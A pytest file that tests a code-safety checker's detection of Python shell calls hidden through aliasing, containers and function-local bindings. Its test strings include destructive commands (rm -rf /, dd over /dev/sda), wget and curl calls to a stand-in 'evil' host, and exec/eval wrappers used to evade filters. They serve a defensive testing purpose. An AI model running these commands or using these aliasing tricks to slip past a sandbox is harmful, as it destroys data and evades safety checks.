# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved.

"""Stage 4: pragmatic single-assignment / inline-container sink aliasing."""

import sys
from pathlib import Path

import pytest

_BACKEND_ROOT = Path(__file__).resolve().parents[1]
if str(_BACKEND_ROOT) not in sys.path:
    sys.path.insert(0, str(_BACKEND_ROOT))

from core.inference.tools import _check_code_safety


def _blocked(code):
    assert _check_code_safety(code) is not None, code


def _ok(code):
    assert _check_code_safety(code) is None, code


class TestAliasedSinkBlocked:
    @pytest.mark.parametrize(
        "code",
        [
            'import os\ns = os.system\ns("rm -rf /")',
            'import os\ns = os.system\ns("dd if=/dev/zero of=/dev/sda")',
            'from os import system as z\nz("rm -rf ~")',
            'import os\n[os.system][0]("rm -rf /")',
            'import os\n(os.system,)[0]("rm -rf /")',
            'import os\n{"k": os.system}["k"]("rm -rf /")',
            'import subprocess\np = subprocess.getoutput\np("wget http://evil -O -")',
        ],
    )
    def test_block(self, code):
        _blocked(code)


class TestFuncLocalAliasBlocked:
    """A shell-sink alias bound inside a function body (not just at module top
    level) must still be resolved -- the sink scan walks the whole tree."""

    @pytest.mark.parametrize(
        "code",
        [
            "import os\ndef run():\n    s = os.system\n    s('curl http://evil')\nrun()",
            "import subprocess\n"
            "def run():\n    p = subprocess.getoutput\n    p('wget http://evil -O -')\nrun()",
        ],
    )
    def test_block(self, code):
        _blocked(code)

    def test_func_local_benign_alias_allowed(self):
        # A non-sink local alias (or a sink alias with a safe command) stays allowed;
        # the ast.walk widening must not introduce false positives.
        _ok("def run():\n    f = sorted\n    return f([3, 1, 2])\nrun()")
        _ok("import os\ndef run():\n    s = os.system\n    s('echo done')\nrun()")

    def test_func_local_exec_alias_blocked(self):
        # An exec builtin aliased inside a function must still be unwrapped and its
        # recovered payload analyzed (exec-env aliasing walks the whole tree).
        _blocked("def f():\n    e = exec\n    e(\"__import__('os').system('id')\")\nf()")
        _blocked("def f():\n    r = eval\n    r(\"__import__('os').system('rm -rf /')\")\nf()")


class TestPerScopeAliasCounting:
    """Alias single-assignment is counted PER function scope: two functions binding
    the same local name must not cancel each other out (a tree-wide count would treat
    both as ambiguous and miss a real sink)."""

    def test_two_functions_same_shell_alias_name_blocked(self):
        _blocked(
            "import os\n"
            "def a():\n    s = os.system\n    s('rm -rf /')\n"
            "def b():\n    s = print\na()"
        )

    def test_two_functions_same_exec_alias_name_blocked(self):
        _blocked(
            "def a():\n    e = exec\n    e(\"__import__('os').system('id')\")\n"
            "def b():\n    e = print\na()"
        )

    def test_two_functions_benign_aliases_allowed(self):
        _ok(
            "def a():\n    s = sorted\n    return s([3, 1])\n"
            "def b():\n    s = max\n    return s([1, 2])\na()"
        )

    def test_sink_alias_does_not_leak_into_other_scope(self):
        # A `s = os.system` in one function must NOT make a benign `s = print` call in
        # another function look like a shell sink (would be a false positive).
        _ok(
            "import os\n"
            "def a():\n    s = os.system\n    s('echo hi')\n"
            "def b():\n    s = print\n    s('remove the rm temp files')\n"
            "b()"
        )

    def test_safe_compiled_alias_does_not_shadow_dynamic_exec(self):
        # A safe `c = compile('1+1')` in one function must NOT let a dynamic
        # `c = compile(src); exec(c)` in another function be treated as safe.
        _blocked(
            "def a():\n    c = compile('1 + 1', '<s>', 'eval')\n    eval(c)\n"
            "def b(src):\n    c = compile(src, '<s>', 'exec')\n    exec(c)\n"
            "b('x')"
        )

    def test_function_local_shadow_of_module_alias_allowed(self):
        # A module-level `s = os.system` shadowed by a local `s = print` resolves to
        # the local binding inside that function.
        _ok("import os\ns = os.system\ndef f():\n    s = print\n    s('please rm the files')\nf()")


class TestAliasingLowFalsePositive:
    def test_reassigned_alias_not_treated_as_sink(self):
        # s is stored twice -> ambiguous -> NOT aliased. The literal arg is benign
        # anyway, so this must stay allowed (no flow-insensitive union).
        _ok('import os\ns = os.system\ns = print\ns("hi")')

    def test_alias_with_safe_command_allowed(self):
        _ok('import os\ns = os.system\ns("echo done")')

    def test_container_with_safe_command_allowed(self):
        _ok('import os\n[os.system][0]("echo hi")')

    def test_plain_local_alias_allowed(self):
        _ok("f = sorted\nf([3, 1, 2])")
